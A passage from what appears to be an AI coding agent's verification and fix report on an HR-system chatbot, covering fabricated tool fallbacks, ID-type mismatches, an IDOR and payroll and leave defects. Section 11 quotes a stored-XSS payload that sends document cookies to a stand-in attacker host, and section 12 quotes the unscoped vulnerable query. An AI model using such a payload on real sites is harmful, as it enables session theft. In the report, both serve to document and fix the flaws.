| 5 | F2 | HIGH | Null-initialise the 3 card refs, guard the cards, surface fetch failure | `resources/views/web/src/components/Chatbot/HRMSChatbot.vue:812,825,833,897,913` | small |
| 6 | F8 | MEDIUM | Wrap `chat()` body in a `catch` that calls `failTurn()` | `app/Services/AIService.php` | trivial |
| 7 | F7 | MEDIUM | Thread a retry marker so the user row is not re-inserted | `ChatbotController.php`, `AIService.php`, `useHRMSChatbot.js` | small |
| 8 | F6 | MEDIUM | Build the admin AI-health panel | `resources/views/web/src/module/admin/dashboard/` | small |
| 9 | F10 | LOW | `default:` branch returns an error, not "Simulated success" | `app/Http/Controllers/AI/McpInternalController.php:601-606` | trivial |

**Fix together:** **F1 + F3 + F10** are the same defect (a fabricated fallback where an error belongs) in three files — one commit, one review. **F2 + F5** are the frontend half of the same principle and touch the same card blocks; doing F5 first makes F2's guards simpler, because those three cards stop being tool-triggered.

**Do not fix yet:**
- **F9** and **F11** are spec amendments, not code changes. Both need the Decision 12 defaults confirmed first — the spec still marks that table "a product call, not a technical one", and the timekeeping row as the one genuine judgment call.
- **F7**'s alternative fix (amend §6.3 to make the guarantee UI-only) is a spec decision. Confirm which side is wrong before coding.

---

## 5. Unspecced Behavior

1. **`status='ok'` filter on both history readers** — `AIService.php:577`, `HrmsCopilot.php:92`. The spec says "newest 15"; the code says "newest 15 *successful*". Defensible (an empty row carries nothing) but it changes which 15 reach the model when a session contains failures, and AC-13's arithmetic assumes no filter.
2. **`skipNotFoundRedirect` on the shared error normaliser** — `axiosApiErrors.ts:60-69`. A new opt-out on an app-wide interceptor, added so the chatbot's 404-recovery would not navigate the whole app to the 404 page. Correct, but it is now shared API surface no spec documents.
3. **45s client-side timeout on the chat POST** — `useHRMSChatbot.js`. Compensates for `axiosInstance`'s global 30s, which would otherwise abort before the server's 504. Undocumented coupling: if F4's fix lands, this can drop to ~35s.
4. **`GetAiHealthQuery` returns `start`/`end`** beyond AC-19's five keys.
5. **Rewritten contextual-nudge matcher** — `useHRMSChatbot.js`. Now matches `final-pay`, `duty-roster`, `shift-schedule`, `calendar-schedule`, `staff-scheduler`, `approvers-menu`. Necessary (see F9) but not authorized by any AC.
6. **Approver routes force `chatbot: true`** for all five portals via `createApproverRoutes`, overriding the hr/payroll "off" defaults. Directed by §6.2 prose, not by any AC.

---

## 6. Spec Gaps

1. **AC-44 is unsatisfiable** — see F9.
2. **Decision 6 misstates the existing code.** The spec says "the four current call sites use direct units only, so this spec follows them. Confirm before implementing." All of them in fact perform a recursive `idunder` descendant walk, and there are **five**, not four (`tk/DutyRosterController` has two). The implementation preserved the real behaviour (recursive), which is the opposite of what the spec's text describes. The open question the spec raises — "units only, or units plus descendants?" — was therefore already answered by the codebase. Amend Decision 6 to say so, or the next reader will "correct" the query to direct-units and silently shrink every manager's team.
3. **AC-43 vs §6.2 conflict** — see F11.
4. **AC-23 constrains only the frontend.** It asserts the card shows the tool's values but says nothing about the tool inventing them, which is how F3 passed. A companion AC on tool output would close it.

---

## 7. Verification Limits

- **No database.** `php artisan migrate:status` fails to connect, so C8 and every runtime AC (AC-1…AC-5, AC-8…AC-18, AC-27…AC-31) were verified by **code path tracing only**, not by execution. F1, F3, F7, F8 are traced-not-run; each names the exact branch, but none was observed firing.
- **No browser.** AC-32, AC-35, AC-36, AC-37, AC-38 and C47 are geometry and stacking claims verified from Tailwind classes and the §5.5 layer table. `pb-20` = 80px and launcher ≈ 56px are computed, not measured. **AC-32 — the reported symptom that motivated Decision 11 — has not been observed fixed.**
- **No test suite exercised.** No PHPUnit test covers `/api/ai/*`; the project configures no JS test runner. `npm run build` passes, which proves the frontend compiles, not that it behaves.
- **F4's ~91s figure is derived** from reading `PendingRequest::send()` and its retry predicate, not from a timed request against a hung endpoint. The retry-on-`ConnectionException` behaviour is certain from the source; the exact wall-clock depends on Guzzle's timeout accounting.
- **Verifier bias disclosure:** the implementation under review was written by this same agent in the two preceding turns. Findings F1, F3 and F10 are pre-existing code that the hardening pass did not touch; F4, F5, F7 and F8 are defects **introduced or left standing by that implementation**. F5 in particular is a regression the `$toolCards` map created. This report should be treated as a first pass, not as independent review.


---

## 8. Resolution — 2026-08-27

Applied by `/webkit.fix` on `feature/ai-chatbot-hardening`. `npm run build` passes; every PHP file
parses; `php artisan route:list --path=ai-health` resolves.

| Finding | Status | What changed |
| :--- | :--- | :--- |
| F1 | ✅ fixed | `McpInternalController.php` `case 'payroll.payslip'` — hardcoded figures replaced with `['error' => 'No payslip has been generated for this employee yet.']` |
| F3 | ✅ fixed | `LeaveBalanceTool::run()` — hardcoded 10/15/5 replaced with `['error' => 'No leave credits are on record for this employee.']` |
| F4 | ✅ fixed | `AIService::callGeminiApi()` — `retry(2, 500, fn ($e) => ! $e instanceof ConnectionException, throw: false)`. Retries now apply to 4xx/5xx responses only (AC-3); a timeout fails after one attempt (AC-4) |
| F5 | ✅ fixed | **Different fix than the report suggested.** Dropping the three tools from `$toolCards` (as suggested) would have left the `roster`/`payslip`/`attendance-summary` cards with no trigger at all — the keyword matcher that used to set those types was deleted in the hardening pass — contradicting §5.2's "Keep". Instead the mappings stay and `toRichDataEnvelope()` now withholds the card via `SELF_SERVICE_CARDS` when `$toolArgs['empid']` names someone other than the caller. Self-service keeps its cards; a cross-employee query renders prose only |
| F2 | ✅ fixed | `HRMSChatbot.vue` — `employeeAttendance`/`employeePayslip` → `ref(null)`, `rosterSchedule` → `ref([])`; both fetch `catch` blocks set `cardDataError`; the three cards are guarded and a notice renders when data is absent |
| F8 | ✅ fixed | `AIService::chat()` now wraps the turn in `try/catch (\Throwable)` → `failTurn(…, 'provider_error')`. The loop moved to `generateTurn()` unchanged, purely so one catch can cover it |
| F7 | ✅ fixed | `is_retry` added to `MESSAGE_RULES`, forwarded via `$request->boolean('is_retry')` to `chat(..., bool $isRetry)`, which skips the user-row insert. `useHRMSChatbot.js` sends it on Retry only — and deliberately **not** on the 404 session-reset path, where the new session must record the question |
| F6 | ✅ fixed | New module `resources/views/web/src/module/admin/ai_health/` (api / composable / types / page / route + barrel), registered automatically by the admin `import.meta.glob` aggregator at `/admin/ai-health`. Reuses `EmptyState`, `LoadingState`, `StatusBadge` |
| F10 | ✅ fixed | `runToolLogic()` `default:` returns `['error' => 'Tool X is not implemented.']` |
| F9 | ⏸ open | Spec amendment. Blocked on the Decision 12 defaults being confirmed |
| F11 | ⏸ open | Spec amendment. Blocked on the same decision |

### Notes for the next verification pass

- **F5's fix is unverified at runtime.** The `SELF_SERVICE_CARDS` gate reads `$toolArgs['empid']` against
  `$user->empid`; it was traced, not executed. Worth an explicit test: a manager querying a team
  member's roster should get prose with **no** card.
- **The severity-1 fixes are all `['error' => …]` returns** relying on §6.2's "Tool returns `['error' => …]`
  → fed back to the model, which explains it in prose". That path was already exercised by the
  `!$account` branches; it is now the primary no-data path for two tools.
- **F2's guards change what a healthy page looks like:** the three cards render nothing until the lazy
  dashboard fetch resolves. That is intended, but it is a visible behaviour change.
- Still unverified overall: no database and no browser were available, so every runtime AC remains
  traced rather than executed. See §7.


---

## 9. Follow-up — 2026-08-27 (live defect reported by the user)

**Symptom:** Manager quick actions ("pending approvals", "team attendance", "team leave requests",
"team overtime requests") answered *"unable to access"*.

Diagnosed against the live database (`ai_audit_logs`, 19 rows). **Two independent causes**, neither
of which was any of F1–F11:

### Cause A — `empid` type mismatch (fixed)

`accounts.empid` is `varchar(20)` holding zero-padded IDs (`'00342'`; 118 of them). The app-wide
[`CastNumericStrings`](../../app/Traits/CastNumericStrings.php) trait — used by **61 models** —
converts any numeric-looking attribute to `int` on read, so `$user->empid` returns `342`.

Chain: `CopilotInstructions` renders `Employee ID: 342` → the model passes `empid: "342"` →
`McpToolPolicy` compares `'342'` against the stored `'00342'`, concludes the caller is asking about
someone else, and denies. **The model behaved correctly; the app advertised the wrong ID.**

This also denied **employees their own records** (the role-3 branch is pre-existing and has the same
mismatch), and it is why `attendance.summary`, `attendance.logs`, and `roster.view` failed for a
manager who does correctly head unit 4.

Fixed in four places, none of which touches the 61-model trait:

| File | Change |
| :--- | :--- |
| `CopilotInstructions.php` | Prompt renders `getRawOriginal('empid')`, so the model is told `00342`, plus an explicit "pass it exactly as written" instruction |
| `AIService::canonicaliseEmpid()` | Normalises `$args['empid']` to the stored form at the tool boundary, via the query builder (Eloquent would re-apply the trait). Exact match first; numeric fallback only on a miss |
| `McpToolPolicy::sameEmpid()` | Replaces two `===` comparisons; matches numerically when both sides are digits |
| `GetManagedEmployeesQuery::managesEmpid()` | Same tolerance, so the public `/mcp/hrms` path is correct without the boundary normalisation |

Verified against the real account (manager 106, empid `00342`, heads unit 4):

```
attendance.summary {"empid":"342"}   -> ALLOW      roster.view      -> ALLOW
attendance.summary {"empid":"00342"} -> ALLOW      attendance.logs  -> ALLOW
teammate 00133 (unit 4)              -> ALLOW  (AC-16 holds)
outsider "softdev" (unit 26)         -> DENY   (AC-15 holds)
employee self, padded or unpadded    -> ALLOW  (AC-14 self-access, was broken)
employee -> another empid            -> DENY   (AC-14 holds)
```

### Cause B — every tool was advertised to every role (fixed)

`fetchMcpTools()` took no user, so the model saw all ~30 tools whatever the caller's role. It reached
for plausible ones the role cannot execute — `employee.search` and `employee.profile` for a manager,
`payroll.payslip`, `leave.show_form` — and relayed each denial as "unable to access". Six of the ten
denials in the audit log were this, and all six were *correct* authorization decisions surfacing as
apparent breakage.

`McpToolPolicy::allowedTools()` now exposes the role allowlist and `fetchMcpTools(Account $user)`
filters declarations by it:

```
Manager   sees  7 tools    Employee sees 22 tools
Payroll   sees  4 tools    Admin    sees 30 tools (wildcard)
```

Side effect: this silently retires the dead permissions noted in spec §8 — role 6's
`finalpay.compute/checklist/summary` and role 5's `roster.generate` have no declaration, so they are
filtered out rather than offered and then failed.

### Not fixed — a genuine capability gap, not a bug

**Two of the four quick actions have no backing tool at all**, and never did:

| Quick action | Tool | Status |
| :--- | :--- | :--- |
| Show team attendance summary | `attendance.summary` | ✅ works after Cause A |
| Show team leave requests | `leave.history` | ✅ already worked (audit rows 8, 10 `authorized=Y`) |
| **List pending approvals** | — | ❌ **no such tool.** Only `leave.approve`, which acts on one `application_id` |
| **Show team overtime requests** | — | ❌ **no such tool**, and `overtime.*` is not in the manager allowlist |

Those two pills were only ever backed by the `approval-list` mock card that Decision 8 deleted. After
Cause B's fix the assistant will say it has no way to do that, rather than "unable to access" — but
the capability still does not exist. Building `approvals.list` / `overtime.list` tools is new feature
work and needs its own spec; **removing the two pills is the alternative.** That is a product call.


---

## 10. Follow-up — 2026-08-27 (payslip returned "no payslips generated")

F1 removed the fabricated payslip fallback, which exposed a defect underneath it that the fallback had
hidden completely: **`payroll.payslip` queried `ytd_details`**, the year-end BIR annualisation table,
not a payslip source. It returned nothing for every user; the hardcoded figures meant nobody noticed.

Fixed by reusing the existing queries behind `/api/employee/payslips` rather than a third
implementation, per the repo's reuse rule:

| Before | After |
| :--- | :--- |
| `YtdDetail::where('idacct', …)->first()` | `GetEmployeePayslipListQuery` (no period named) / `GetEmployeePayslipQuery` (specific `pay_period_id`) |
| 0 rows for the test account | 4 released payslips |

Also falls back one year when the current year is empty, so a January question still finds December.

**This is the general risk F1/F3 created and it is worth stating plainly:** removing a fabricated
fallback converts a silent wrong answer into a visible "no data" answer — which is correct, but it
surfaces whatever query defect the fallback was masking. Every other legacy tool was therefore
smoke-tested against live data (`leave.balance`, `leave.history`, `roster.view`, `attendance.summary`,
`attendance.logs`, `incident.list`); all read the correct tables and returned real rows.


---

## 11. Follow-up — 2026-08-27 (reply formatting) + a security finding verification missed

**Reported:** the assistant's answers were unstructured prose.

Two causes, and a third defect found while fixing them.

| # | Finding | Severity |
| :--- | :--- | :--- |
| A | The prompt never specified a format — rule 4 said only "summarize the findings clearly in plain language" | MEDIUM |
| B | The renderer supported almost no markdown — only `* ` bullets and `**bold**`. A `-` bullet (which models emit at least as often), a numbered list, a heading, or a table all fell through as plain paragraphs | MEDIUM |
| C | **`parseMessageText()` fed `v-html` with no HTML escaping — stored XSS** | **CRITICAL** |

### C is the one that matters

`inlineFormat()` applied `<strong>`/`<em>` to the raw model reply and the result went straight into
`v-html`. The model echoes tool output, and tool output is database content. An incident titled
`<img src=x onerror="fetch('//attacker/'+document.cookie)">` executes in the browser of every user
who asks the assistant to list incidents — a manager, or HR.

Fixed by escaping before any markup is added (`escapeHtml` inside `inlineFormat`, applied to every
path including table cells). Verified: `<img src=x onerror=...>` and `<b>` both render as visible
text, no live tag survives.

**This should have been caught by the verification pass and was not.** The spec's §6.3 Non-Functional
checklist covers *input* validation boundaries and has no output-encoding row, so no claim in the
checklist pointed at it — Phase 6 (unspecced behaviour) looked at what the code does, not at what it
fails to do to data on the way out. Worth adding an "output encoding / template injection" row to the
spec's checklist so the next verification has a claim to test.

### A and B

`CopilotInstructions` gained an explicit Response Format section: lead sentence, `- ` bullets, pipe
tables for 3+ like records, **bold** figures, PHP currency, ~120-word cap, and an explicit ban on raw
JSON / internal field names (`net_pay`, `idacct`) / database IDs.

`parseMessageText()` now renders exactly that subset — headings, `-`/`*`/`•` and numbered lists, pipe
tables (horizontally scrollable inside the narrow bubble), bold, italic, `code` — verified against a
realistic payslip reply.


---

## 12. Follow-up — 2026-08-27 (payslip detail for a named period)

**Reported:** asking for the detail of a specific period returned nothing.

**Cause — wrong identifier.** `GetEmployeePayslipListQuery` exposes `payroll_run_detail.id` as `id`
(377 for Feb 16-28). The tool passed that as `period_id` to `GetEmployeePayslipQuery`, whose
period branch matches `idpayperiod` (52 for the same row). No match, every time. Introduced by §10's
fix; the list/detail identifier mismatch was not checked when the queries were wired up.

**Second, more serious defect found while fixing it — an IDOR.** `GetEmployeePayslipQuery`'s `id`
branch applies **no account scope**:

```php
if (!empty($params['id'])) { $query->where('id', $params['id']); }   // no idacct filter
```

and a tool call carrying only a payslip id has no `empid`, so `McpToolPolicy`'s self-only gate
(`$empid === null` → allow) waves it through. Any employee could have read any other employee's
payslip — gross, deductions, net, and every line item — by passing its id.

Fixed by resolving the reference against the caller's own released rows before fetching:

```php
$detail = PayrollRunDetail::where('idacct', $account->id)
    ->whereNotNull('released_at')
    ->where(fn ($q) => $q->where('id', $wanted)->orWhere('idpayperiod', $wanted))
    ->first();
```

Verified against live data: another account's payslip id is refused; the caller's own resolves and
returns 4 earnings and 7 deduction line items. The payload handed to the model is trimmed to
coverage / gross / deductions / net / line items / YTD — the company block and signatories are for
the printed payslip and only invite the model to repeat them oddly.

**Pattern worth noting for the next verification pass:** the self-only policy gate keys on `empid`.
Any tool that accepts a *different* identifier (a record id, a document number, an application id)
bypasses it entirely. `payroll.payslip` was the first such tool; `leave.cancel`, `changeshift.cancel`,
`overtime.cancel`, `businesstrip.cancel`, and `incident.details` all take ids and deserve the same
audit.


---

## 13. Follow-up — 2026-08-27 (chat applications did not match the Applications page)

**Reported:** applications filed from chat are not the same as ones filed from timekeeping.

Correct, and the divergence was in the payload, not the endpoint — both post to
`POST /api/employee/submit_application`.

**The real flow is two steps.** Each Applications tab calls
`POST api/employee/generate_schedule` with `{type, date:{startDate,endDate}}`, gets back
`generated_events` — the employee's actual rostered rows, carrying their real `idshift`, `stime`,
`etime`, `reghrs`, and the current `idpayperiod` — then submits exactly those as `data`.

**The chat forms skipped step one** and fabricated the rows:

```js
{ start, idleave, idshift: 1, period: 1, stime: '08:00', etime: '17:00',
  reghrs: 8, days: 1, idpayperiod: activePayPeriodId.value || 1 }
```

Verified against the reporting account (106): their real schedule is **shift 49, 23:30-07:30,
pay period 53**. Every leave or OBT filed from chat was therefore written against shift 1, an
08:00-17:00 day, and possibly pay period 1 — wrong on every field that matters, and silently so.
Overtime additionally sent `data` as an object where leave and change-shift sent an array.

It also bypassed `BuildScheduleQuery::generate`, which **validates the approval matrix before
building anything** and throws `"No approval matrix configured for {name}"`. A chat-filed request
could be created with nobody able to approve it.

**Fixed** by routing all four forms through a shared `fileApplication({type, startDate, endDate,
remarks, decorate, extraAdditional})` helper that performs the real two-step flow. `decorate` applies
the per-type stamp each Applications tab applies:

| Type | Stamp | Mirrors |
| :--- | :--- | :--- |
| `leave` | `idleave` on every row | `Leaves.vue:264` |
| `cs` | `newshift` on every row (`oldshift` comes from the server) | `ChangeShift.vue:142` |
| `ot` | `planhrs` derived from the generated shift times | `Overtime.vue:146` |
| `obt` | `type` on the event + `obt_type` in `additional` | `OfficialBusinessTrip.vue:165` |

Also removed: the chat form's **"Current Shift" picker** (the server resolves the rostered shift, so
the control was overwritten and could only introduce a wrong value), and the **dead
attendance-adjustment handler** left behind when Decision 8 deleted its card.

**Root-cause pattern, worth a spec note:** the chatbot reimplemented a flow that already existed
rather than calling it — the same defect class as §10 (`payroll.payslip` querying `ytd_details`
instead of reusing `GetEmployeePayslipListQuery`). Every chatbot tool and form should be audited
against the module that owns the same operation.


---

## 14. Follow-up — 2026-08-27 (no filing path for attendance adjustment)

`aa` was the only one of the five application types with no way to file it from chat. Two changes
compounded: Decision 8 deleted the `logs-adjustment` card because it rendered `mockAnomalies`, and
§13's rewrite removed the handler that card had left orphaned. Nothing replaced either.

Added end to end:

| Layer | Change |
| :--- | :--- |
| Tool | `adjustment.show_form` declared in `AIService::fetchMcpTools()`; case in `McpInternalController` returning `{tool:'adjustment-form', result:null}` |
| Card map | `'adjustment.show_form' => 'adjustment-form'` in `$toolCards` |
| Permissions | Added alongside the other four `*.show_form` tools — role 3's allowlist and roles 2/4/5/6's `$selfOnlyByRole`. Verified ALLOW for roles 2, 3, 4, 6 (no role-5 account exists to test) |
| Form | Date, time in, time out, remarks — matching what `AttendanceAdjustment.vue` collects on top of the generated row |
| Submit | `fileApplication({type:'aa', …})`, so it uses the same two-step `generate_schedule` → `submit_application` flow as every other type |
| Hours | `hrs` derived via the module's own `calculateHours()`, imported rather than reimplemented |

`calculateHours` handles the midnight wrap (negative minutes → +24h), which the reporting account
needs — their roster is 23:30-07:30. Verified: `11:30 PM → 7:30 AM, break 0 = 8.00`;
`10:00 PM → 6:00 AM, break 1 = 7.00`. The `<input type="time">` 24-hour value is converted to the
`h:mm AM/PM` form that function parses.

Also repointed two Timekeeping quick actions ("Missing Logs Form", "Timesheet Adjustments") that
phrased their message toward read-only tools and so never opened a form.

**Not verified:** no application was actually submitted — that writes an approval record against live
data. The `generate_schedule` half and the hour maths are confirmed; the submit half is wired
field-for-field against `AttendanceAdjustment.vue` but unexercised.


---

## 15. Follow-up — 2026-08-27 ("Overtime must be at least 1 hour" on a date with no logs)

**Reported:** submitting OT returns *"Overtime must be at least 1 hour."* even when there is no
time-in/out and no approved attendance adjustment.

Correct — and this is shared code, so it affected the Applications page as much as chat.

### Fixed: two dead guards in `CalculateOvertimePlanHoursAction`

1. **The honest error was unreachable.** The guard read `if (! $getTimeLogs)`, but the fallback
   immediately above assigns `$getTimeLogs['timelogs']` unconditionally — so with no logs and no
   adjustment the array is still `['timelogs' => []]`, which is truthy. Every such request fell
   through to the duration check and surfaced as a message about *length* when the real problem was
   that there was nothing to measure. The guard now tests the logs themselves and distinguishes
   three cases: no record at all, a time-in with no time-out, and a time-out with no time-in.

2. **The adjustment fallback never ran.** Its condition was `! $getTimeLogs['timelogs']`, which only
   asks whether a timesheet ROW exists — and one exists for every rostered day, empty logs included.
   So on a day with no punches the approved adjustment filed to cover that day was never read. It now
   falls back whenever the row lacks a usable time-in/time-out pair.

Verified on the reporting account: an unapproved adjustment now yields *"…or have an attendance
adjustment approved…"*, and an approved one that covers exactly the rostered shift correctly yields
*"Overtime must be at least 1 hour"* — accurate, because there is no overtime in it.

### NOT fixed — a payroll defect found while verifying, needs a decision

`CalculateOvertimePlanHoursAction` builds its comparison with
`new DateTime('07:30:00')` and `new DateTime('06:56:00')` — **times only**. Both default to today, so
the `date_in` / `date_out` the timesheet row carries are discarded. When the time-out is earlier in
the clock than the shift end, the `if ($submittedEndTime < $shiftEndTime) modify('+1 day')` branch
fires and turns an *early* finish into nearly a full day of overtime.

Live example, account 106, 2026-03-11 (shift 49, 23:30 → 07:30 next day):

```
worked  date_in 2026-03-11 23:30:00  ->  date_out 2026-03-12 06:56:00
i.e. the employee left 34 minutes EARLY — there is no overtime
action returns: 23.43 hours
```

**Blast radius: 917 timesheet rows across 118 employees** have a time-out earlier in the clock than
their shift end. Every one would compute ~24h of overtime if an OT request were filed against it.
Existing `app_overtime` rows look sane (max 3.00 planhrs), so this has not been written at scale yet.

The fix is to compare real datetimes built from `date_in`/`date_out` rather than bare times, flooring
at zero. That changes a payroll figure, and `checkAdjustmentLogs` returns only `date` (no
`date_in`/`date_out`), so the adjustment path needs a derivation rule too. **Left for the user to
decide rather than changed unilaterally.**


---

## 16. Follow-up — 2026-08-27 (leave balance blank; leave type hardcoded)

Both suspicions were correct, and the second is the more serious.

### Balance always zero

`LeaveBalanceTool` read `$bal->balance` off `account_leaves`. **That column does not exist** — the
table has `entitle`, `carry_over`, `isclosed`, `prev_used`, `conversion`, `eto_stat`. `(float) null`
is `0.0`, so every balance the assistant ever reported was zero, for every employee.

A balance is `entitle - (approved + pending)`, computed by
[`HandleAccountLeave::getLeaves()`](../../app/Handlers/AccountLeave/HandleAccountLeave.php) —
the query behind the Leave Credits page and `/api/employee/shift_schedule`. The tool now reuses it.

| Account 106 | Before | After |
| :--- | ---: | ---: |
| Sick Leave | 0 | **5** (10 entitled − 5 used) |
| Vacation Leave | 0 | **7** (10 − 3) |
| Emergency Leave | 0 | **3** (3 − 0) |

### Leave types hardcoded — and mapped to the wrong ids

Hardcoded in two places: the tool mapped `idleave` 1/2/3 → Sick/Vacation/Emergency, and the chat form
mapped names back with `type === 'Vacation Leave' ? 2 : (type === 'Sick Leave' ? 1 : 3)` over three
static `<option>` values.

The `leaves` table holds **21 active types**, and the third id is not Emergency:

```
picking "Sick Leave"       -> idleave 1 = "Sick Leave"          ok
picking "Vacation Leave"   -> idleave 2 = "Vacation Leave"      ok
picking "Emergency Leave"  -> idleave 3 = "Leave Without Pay"   *** should be 9 ***
```

So filing an emergency leave from chat filed an **unpaid** leave. `idleave` 9 is Emergency Leave;
3 is Leave Without Pay. Beyond the mis-map, 18 further types (Solo Parent, Paternity, Bereavement,
Maternity, Magna Carta, Mental Health, …) were unreachable from chat entirely.

**No data was damaged:** `app_leave` holds 0 rows for `idleave` 3 and 0 for 9, so nothing was ever
mis-filed — the window closed before it was used.

The form now populates types, ids and balances from the employee's own credits, which the chatbot's
existing `/api/employee/shift_schedule` call already returns, and shows the remaining balance in each
option (`Sick Leave (5 left)`) — which also answers the reported symptom directly.

### Same root pattern, fourth occurrence

`payroll.payslip` read `ytd_details` instead of reusing `GetEmployeePayslipListQuery` (§10); the
application forms rebuilt the payload instead of calling `generate_schedule` (§13);
`CalculateOvertimePlanHoursAction` reimplemented time maths that lost the date (§15); and here a
balance was invented from a non-existent column instead of reusing `HandleAccountLeave::getLeaves()`.
**Every chatbot tool should be audited against the module that owns the same operation** — this is
now the fourth instance and the pattern is fully established.
